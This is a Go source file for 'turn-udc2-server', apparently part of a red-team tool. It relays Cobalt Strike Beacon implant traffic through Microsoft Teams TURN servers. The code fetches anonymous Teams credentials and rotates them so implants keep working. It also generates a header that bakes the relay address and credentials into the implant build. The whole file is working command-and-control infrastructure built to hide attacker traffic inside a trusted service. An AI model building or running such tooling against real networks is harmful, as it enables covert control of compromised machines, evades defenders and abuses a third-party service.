// turn-udc2-server is the operator-side UDC2 server for Cobalt Strike
// User-Defined C2 over TURN. It allocates a relay on a TURN server
// (Microsoft Teams by default), waits for Beacon sessions arriving over
// TURN, and relays their frames to a Cobalt Strike team server UDC2
// listener.
package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/jamiepegg/turn-c2/internal/msteams"
	"github.com/jamiepegg/turn-c2/internal/udc2"
)

var version = "dev"

func main() {
	var (
		turnServer   = flag.String("turn-server", msteams.DefaultServerHost+":"+fmt.Sprint(msteams.DefaultServerPort), "TURN server host:port (TURNS)")
		turnServerIP = flag.String("turn-server-ip", "", "pin TURN server IP (SNI/cert validation still uses the hostname; recommended so operator and Beacon use the same relay pool)")
		username     = flag.String("username", "", "TURN username (default: fetch anonymously from Teams)")
		password     = flag.String("password", "", "TURN password (default: fetch anonymously from Teams)")
		tsAddr       = flag.String("ts-addr", "127.0.0.1", "team server address (UDC2 listener)")
		tsPort       = flag.Int("ts-port", 0, "team server UDC2 listener port (required)")
		permitCIDR   = flag.String("permit-cidr", "", "extra /24 to permit for first contact (comma separated)")
		permitSelf24 = flag.Bool("permit-self-24", false, "permit the /24 around the relay IP (implied by -probe)")
		probePool    = flag.Int("probe", 8, "relay pool discovery: number of throwaway allocations whose /24s are permitted (0 disables)")
		chunkSize    = flag.Int("chunk-size", 1200, "TURN message payload size sent to Beacons (keep small; large messages can be dropped)")

		emitConfig  = flag.String("emit-bof-config", "", "write a bof_config.h for the BOF build (recommended: bof/bof_config.h)")
		verbose     = flag.Bool("verbose", false, "chatty logging")
		showVersion = flag.Bool("version", false, "print version and exit")
	)
	flag.Parse()

	if *showVersion {
		fmt.Println("turn-udc2-server", version)
		return
	}
	if *tsPort == 0 {
		fmt.Fprintln(os.Stderr, "error: --ts-port is required (the team server's UDC2 listener port)")
		flag.Usage()
		os.Exit(2)
	}

	user, pass := *username, *password
	var creds *msteams.Credentials
	if user == "" || pass == "" {
		log.Printf("[*] fetching anonymous TURN credentials from Microsoft Teams...")
		var err error
		creds, err = msteams.Fetch()
		if err != nil {
			log.Fatalf("[-] credential fetch failed: %v", err)
		}
		user, pass = creds.Username, creds.Password
		log.Printf("[+] credentials: realm=%q username=%s password=%s", creds.Realm, creds.Username, creds.Password)
		if t, ok := creds.ExpiresAt(); ok {
			log.Printf("[*] credentials 'expires' interpreted as: %s", t.Format(time.RFC3339))
		}
		if t, ok := creds.UsernameExpiry(); ok {
			log.Printf("[*] username embeds expiry: %s", t.Format(time.RFC3339))
		}
	}

	// Rotate credentials before they expire so the relay (and the Beacon
	// payloads baked against it) outlives the ~7-day Teams credential
	// lifetime. Only possible when the credentials came from the anonymous
	// Teams flow.
	var credRefresher func(ctx context.Context) (string, string, time.Time, error)
	var initialExpiry time.Time
	if creds != nil {
		if t, ok := creds.ExpiresAt(); ok {
			initialExpiry = t
		}
		credRefresher = func(ctx context.Context) (string, string, time.Time, error) {
			c, err := msteams.Fetch()
			if err != nil {
				return "", "", time.Time{}, err
			}
			var exp time.Time
			if t, ok := c.ExpiresAt(); ok {
				exp = t
			}
			return c.Username, c.Password, exp, nil
		}
	}

	var permitCIDRs []string
	for _, c := range strings.Split(*permitCIDR, ",") {
		if c = strings.TrimSpace(c); c != "" {
			permitCIDRs = append(permitCIDRs, c)
		}
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	cfg := udc2.Config{
		TurnServer:        *turnServer,
		TurnServerIP:      *turnServerIP,
		Username:          user,
		Password:          pass,
		CredRefresher:     credRefresher,
		InitialCredExpiry: initialExpiry,
		TSAddr:            *tsAddr,
		TSPort:            *tsPort,
		PermitCIDRs:       permitCIDRs,
		PermitSelfSlash24: *permitSelf24,
		ProbePool:         *probePool,
		ChunkSize:         *chunkSize,
		Verbose:           *verbose,
		OnReady: func(relayAddr *net.UDPAddr, serverAddr net.Addr) {
			fmt.Println()
			fmt.Println("==========================================================")
			fmt.Printf(" Relay address (bake into the BOF): %s\n", relayAddr)
			fmt.Printf(" TURN server:                        %s\n", serverAddr)
			fmt.Println("==========================================================")
			fmt.Println()
			if *emitConfig != "" {
				if err := writeBOFConfig(*emitConfig, *turnServer, serverAddr, relayAddr, user, pass, initialExpiry, *chunkSize); err != nil {
					log.Printf("[-] could not write BOF config: %v", err)
				} else {
					log.Printf("[+] wrote %s; rebuild the BOF (make -C bof) and create/update your UDC2 listener", *emitConfig)
				}
			}
		},
	}

	log.Printf("[*] turn-udc2-server %s starting", version)
	if err := udc2.Run(ctx, cfg, log.Default()); err != nil {
		log.Fatalf("[-] server exited: %v", err)
	}
}

// writeBOFConfig emits a header consumed by the BOF build. The TURN
// server IP is pinned so the Beacon-side BOF lands on the same TURN
// server (and relay pool) as the operator server, regardless of the
// target's geo-DNS view.
//
// The generated header is self-sufficient: it must define everything the
// BOF sources consume. Keep it in sync with bof_config.h.example (the
// template with placeholder values) when adding tunables.
func writeBOFConfig(path, turnServer string, serverAddr net.Addr, relayAddr *net.UDPAddr, username, password string, credExpiry time.Time, chunkSize int) error {
	host, port, _ := net.SplitHostPort(turnServer)
	if port == "" {
		port = "443"
	}
	serverIP := ""
	if hostPort, _, err := net.SplitHostPort(serverAddr.String()); err == nil {
		if ip := net.ParseIP(hostPort); ip != nil && ip.To4() != nil {
			serverIP = hostPort
		}
	}
	credExpires := int64(0)
	if !credExpiry.IsZero() {
		credExpires = credExpiry.Unix()
	}
	var b strings.Builder
	fmt.Fprintf(&b, "// Generated by turn-udc2-server at %s. Overwritten on every run.\n", time.Now().Format(time.RFC3339))
	fmt.Fprintf(&b, "#pragma once\n\n")
	fmt.Fprintf(&b, "#define TURN_SERVER_HOST \"%s\"\n", host)
	fmt.Fprintf(&b, "#define TURN_SERVER_PORT %s\n", port)
	fmt.Fprintf(&b, "#define TURN_SERVER_ADDR \"%s\" // pinned IP; SNI/cert validation still uses the hostname\n", serverIP)
	fmt.Fprintf(&b, "#define TURN_USERNAME \"%s\"\n", escapeC(username))
	fmt.Fprintf(&b, "#define TURN_PASSWORD \"%s\"\n", escapeC(password))
	fmt.Fprintf(&b, "#define TURN_CRED_EXPIRES %d // unix seconds; 0 = unknown\n", credExpires)
	fmt.Fprintf(&b, "#define TURN_PEER_COUNT 1\n")
	fmt.Fprintf(&b, "#define TURN_PEER_ADDRS { \"%s\" }\n", relayAddr.String())
	fmt.Fprintf(&b, "\n// Tunables (override with -D at build time if needed).\n")
	fmt.Fprintf(&b, "#ifndef TURN_CHUNK_SIZE\n#define TURN_CHUNK_SIZE %d\n#endif\n", chunkSize)
	fmt.Fprintf(&b, "#ifndef TURN_PROXY_TIMEOUT_MS\n#define TURN_PROXY_TIMEOUT_MS 60000\n#endif\n")
	fmt.Fprintf(&b, "#ifndef TURN_KEEPALIVE_MS\n#define TURN_KEEPALIVE_MS 240000\n#endif\n")
	fmt.Fprintf(&b, "#ifndef TURN_IO_TIMEOUT_MS\n#define TURN_IO_TIMEOUT_MS 5000\n#endif\n")
	fmt.Fprintf(&b, "#ifndef TURN_MAX_FRAME\n#define TURN_MAX_FRAME (1024 * 1024)\n#endif\n")
	fmt.Fprintf(&b, "#ifndef TURN_CRED_REFRESH_MARGIN_S\n#define TURN_CRED_REFRESH_MARGIN_S 86400\n#endif\n")
	fmt.Fprintf(&b, "#ifndef TURN_CRED_UNKNOWN_TTL_S\n#define TURN_CRED_UNKNOWN_TTL_S 86400\n#endif\n")
	return os.WriteFile(path, []byte(b.String()), 0o644)
}

func escapeC(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch r {
		case '"', '\\':
			b.WriteByte('\\')
			b.WriteRune(r)
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}
